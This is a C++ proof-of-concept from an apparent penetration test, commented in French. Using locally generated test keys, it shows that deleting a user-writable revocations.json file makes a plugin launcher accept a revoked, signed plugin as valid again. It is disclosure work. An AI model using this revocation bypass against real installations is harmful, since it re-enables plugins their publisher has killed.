// PoC — fail-open des révocations (pentest V8, étape 2).
//
// Démontre que, SANS le fichier revocations.json (supprimé ou absent), un
// plugin pourtant RÉVOQUÉ par une liste signée valide est de nouveau jugé
// « Valide » par le launcher. Le kill-switch distant est donc neutralisé
// par la simple suppression d'un fichier de cache en écriture utilisateur.
//
// 100 % local : clés de test fabriquées ici, aucun réseau, aucun serveur.

#include "secrets.hpp"
#include "signing.hpp"

#include "monocypher-ed25519.h"

#include <nlohmann/json.hpp>

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>

using nlohmann::json;
namespace fs = std::filesystem;
using namespace tl;
using signing::Status;

namespace {

struct Key {
    std::uint8_t sk[64];
    signing::PublicKey pk;
};
Key make_key(std::uint8_t b) {
    std::uint8_t seed[32];
    std::memset(seed, b, sizeof(seed));
    Key k;
    crypto_ed25519_key_pair(k.sk, k.pk.data(), seed);
    return k;
}
std::string b64(const std::string& s) {
    return secrets::b64_encode(reinterpret_cast<const unsigned char*>(s.data()), s.size());
}
json sign_obj(const std::string& payload, const Key& k) {
    std::uint8_t sig[64];
    crypto_ed25519_sign(sig, k.sk, reinterpret_cast<const std::uint8_t*>(payload.data()),
                        payload.size());
    return {{"payload", b64(payload)}, {"sig", secrets::b64_encode(sig, sizeof(sig))}};
}
json make_cert(const Key& root, const Key& inter, const std::string& keyId,
               const std::vector<std::string>& usages) {
    const std::string pub(reinterpret_cast<const char*>(inter.pk.data()), 32);
    return sign_obj(json{{"type", "tl-key-cert"}, {"v", 1}, {"keyId", keyId},
                         {"publicKey", b64(pub)}, {"usages", usages},
                         {"notBefore", 1000}, {"notAfter", 4000000000}}.dump(),
                    root);
}
void write(const fs::path& p, const std::string& s) {
    fs::create_directories(p.parent_path());
    std::ofstream(p, std::ios::binary) << s;
}
void sign_dir(const fs::path& dir, const std::string& id, const std::string& ver,
              const Key& root, const Key& inter) {
    json files = json::object();
    for (const auto& e : fs::recursive_directory_iterator(dir)) {
        if (!e.is_regular_file()) continue;
        const std::string rel = fs::relative(e.path(), dir).generic_string();
        if (rel == "signature.json") continue;
        files[rel] = *signing::sha512_file_hex(e.path());
    }
    const json release{{"type", "tl-plugin-release"}, {"v", 1}, {"pluginId", id},
                       {"version", ver}, {"keyId", "int-1"}, {"signedAt", 2000000000},
                       {"files", files}};
    write(dir / "signature.json",
          json{{"v", 1}, {"cert", make_cert(root, inter, "int-1", {"plugin"})},
               {"release", sign_obj(release.dump(), inter)}}.dump());
}
std::string make_revocations(const Key& root, const Key& inter, std::int64_t seq,
                             const json& extra) {
    json list{{"type", "tl-revocations"}, {"v", 1}, {"seq", seq}, {"issuedAt", 2000000000}};
    for (auto it = extra.begin(); it != extra.end(); ++it) list[it.key()] = it.value();
    return json{{"v", 1}, {"cert", make_cert(root, inter, "int-rev", {"revocation"})},
                {"list", sign_obj(list.dump(), inter)}}.dump();
}
const std::int64_t kNow = 2000000100;

const char* label(Status s) {
    switch (s) {
    case Status::Valid: return "VALIDE";
    case Status::Revoked: return "RÉVOQUÉ";
    case Status::Invalid: return "INVALIDE";
    default: return "NON SIGNÉ";
    }
}

} // namespace

int main() {
    const Key root = make_key(1), inter = make_key(2);
    const signing::Roots roots{{root.pk}};
    const fs::path dir = fs::temp_directory_path() / "tl_poc_revocation" / "demo";
    std::error_code ec;
    fs::remove_all(dir.parent_path(), ec);
    write(dir / "plugin.json", R"({"name":"Demo","version":"1.0"})");
    write(dir / "bin" / "service.exe", "binaire factice");
    sign_dir(dir, "demo", "1.0", root, inter);

    auto verdict = [&](const signing::Revocations* revs) {
        return signing::verify_release_dir(dir, signing::Kind::Plugin, "demo", "1.0", roots,
                                           revs, kNow)
            .status;
    };

    // 1. Plugin signé, aucune révocation en vigueur -> Valide (normal).
    const Status base = verdict(nullptr);
    std::printf("1. signe, sans liste de revocation           : %s\n", label(base));

    // 2. L'equipe publie une liste signee qui revoque demo@1.0.
    std::string err;
    const auto revs = signing::parse_revocations(
        make_revocations(root, inter, 1,
                         {{"releases", json::array({json{{"id", "demo"}, {"version", "1.0"}}})}}),
        roots, kNow, -1, &err);
    const Status revoked = (revs ? verdict(&*revs) : Status::Invalid);
    std::printf("2. liste de revocation presente              : %s\n", label(revoked));

    // 3. ATTAQUE : revocations.json supprime -> current_revocations() rend une
    //    liste VIDE au prochain lancement (load_cache_locked : if(!in) return;).
    //    On modelise ce cas par l'absence de liste.
    const Status afterDelete = verdict(nullptr);
    std::printf("3. APRES suppression de revocations.json     : %s\n", label(afterDelete));

    const bool bypass = (base == Status::Valid && revoked == Status::Revoked &&
                         afterDelete == Status::Valid);
    std::printf("\n%s : un plugin revoque redevient %s sans le fichier de revocation.\n",
                bypass ? "FAIL-OPEN CONFIRME" : "pas de bypass", label(afterDelete));
    fs::remove_all(dir.parent_path(), ec);
    return bypass ? 0 : 1;
}
